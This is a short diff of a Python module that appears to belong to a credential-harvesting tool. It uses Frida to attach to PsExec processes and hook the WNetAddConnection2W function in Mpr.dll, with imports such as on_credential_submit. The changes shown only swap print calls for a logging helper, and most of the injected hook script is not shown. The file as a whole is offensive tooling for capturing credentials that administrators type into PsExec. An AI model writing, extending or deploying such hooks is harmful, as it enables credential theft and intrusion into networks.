@@ -1,16 +1,23 @@
 import frida
-from PyHook import wait_for_process, on_credential_submit
+from PyHook import wait_for_process, on_credential_submit, log
+
+
+hook_process_name = "psexec"
+
+
+def logger(message):
+    log(hook_process_name, message)
 
 
 def wait_for():
-    wait_for_process(["PsExec64.exe", "PsExec.exe", "psexec.exe"], "PsExec", hook)
+    wait_for_process(["PsExec64.exe", "PsExec.exe", "psexec.exe"], hook)
 
 
 def hook(pid):
     try:
-        print("[+] Trying To Attach To PsExec")
+        logger("Trying Hook Into PsExec")
         session = frida.attach(pid)
-        print(f"[+] Attached PsExec with pid {pid}!")
+        logger(f"Hooked PsExec With PID {pid}")
         script = session.create_script("""
 
 			var WNetAddConnection2W = Module.findExportByName("Mpr.dll", 'WNetAddConnection2W')
@@ -32,5 +39,5 @@ def hook(pid):
         script.load()
 
     except Exception as e:
-        print("[-] Unhandled exception: " + str(e))
-        print("[-] Continuing...")
+        logger("Unhandled exception: " + str(e))
+        logger("Continuing...")
